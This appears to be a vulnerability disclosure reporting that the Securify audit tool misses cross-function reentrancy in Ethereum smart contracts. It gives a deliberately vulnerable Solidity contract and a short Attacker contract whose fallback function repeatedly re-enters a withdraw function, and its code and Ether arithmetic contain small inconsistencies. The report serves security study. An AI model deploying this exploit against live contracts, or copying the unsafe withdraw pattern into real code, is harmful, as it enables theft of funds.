# Cross-function-reentrancy

## Vendor
Securify

## Vulnerability Type
Reentrancy

## Abstract
We found a vulnerability in Ethereum smart contracts, where an attacker can undesirably re-enter the contract to steal money. 
This vulnerability can bypass "Securify", which is a smart contract audit tool. This tool fails to capture the attacks across different functions. Therefore, it allows attackers to re-enter a contract and steal money. 
The vulnerability can be described as: (1) given a contract `Vulnerable` containing two transfer functions `withdrawPortion` and `withdrawAll`. 
(2) An attacker withdraw Ether by calling `withdrawAll`, then the `fallback` function of `Attacker` is automatically invoked. 
(3) In the `fallback` function,  the attacker calls the `withdrawPortion` to withdraw money again and again. 

## Details
"Securify" is a Ethereum smart contract audit tool, which has a large group of users. You can use "Securify" to check if a smart contract has vulnerabilities.

<div align=center><img width="520" height="240" src="./images/securify.png"/></div>
<div align=center>Figure 1: Securify: smart contract aduit tool</div>

We found the vulnerability which can be regarded as cross-function reentrancy, which bypasses the detection of `Securify`.

<div align=center><img width="520" height="240" src="./images/cross-function.png"/></div>
<div align=center>Figure 2: A specific instance of cross-function reentrancy</div>

Contract `Vulnerable` contains two transfer functions `withdrawAll` and `withdrawPortion`, both of the two functions can send Ether to other contracts.
* `withdrawAll` declares a transfer operation, which allows a recipient to withdraw all his/her money.
* `withdrawPortion` declares another transfer operation, which allows a recipient to withdraw part of his/her money.

```
contract Vulnerable{
  ...
  
  // withdraw all the money
  function withdrawAll(address to) external {
      uint256 amount = userBalances[msg.sender];
      if (userBalances[msg.sender] > 0) {
        require(msg.sender.call.value(amount)());
    	  userBalances[msg.sender] = 0;
      }
  }
  
  // withdraw part of the money
  function withdrawPortion(uint _amount) external {   
     if (userBalances[msg.sender] >= amount) {
        require(msg.sender.call.value(amount)());
        userBalances[msg.sender] -= amount;
     }
  }
}
```

## Exploit
The attacker can withdraw 10 Ether from contract `Vulnerable` by calling the function `withdrawAll` of contract `Vulnerable`. 
Then, the attacker utilizes the `fallback` function to call the function `withdrawPortion` of `Vulnerable` 9 times. 
In total, the attacker may withdraw 90 Ether, which is much more than expected. Therefore, it allows attacker to steal money.

```
contract Attacker{
  ...
  
  function attack(){
    vul.withdrawAll(_owner);
  }

  function () payable{ // fallback function
     count++;
     if(count < 10){
       vul.withdrawPortion(1 ether);
     }
  }
}
```

**Analysis** `userBalances[msg.sender]` is the critical variable as it records the amount of Ether that the caller holds in the contract. 
After the transfer operation `require(msg.sender.call.value(amount)());` (line 6 in Figure 2 left) of function `withdrawAll` is executed, the `fallback` function of contract `Attacker` will be triggered before the `userBalances[msg.sender]` is updated, 
thus making the contract `Vulnerable` believe that the attacker still has enough Ether in the contract. Then, the `fallback` function of contract `Attacker` calls the function `withdrawPortion` of `Vulnerable` recurrently until the `count` reaches 10. `if (count < 10) { vul.withdrawPortion(1 Ether); }`. 


## Conclusion
Overall, we would like to highlight that this cross-function reentrancy is common in Ethereum smart contracts while "Securify" cannot capture them. Attackers can make use of two transfer across different functions and the `fallback` mechanism to re-enter a contract to steal money. Therefore, solidity developers should carefully audit their code whether they use bad cross transfer functions.

## Reference
Securify Official Website

https://securify.chainsecurity.com/

Github

https://github.com/eth-sri/securify

Ethereum Official Website

https://etherscan.io/

contract code

https://github.com/Messi-Q/SmartContracts/blob/master/Cross-function-reentrancy.sol
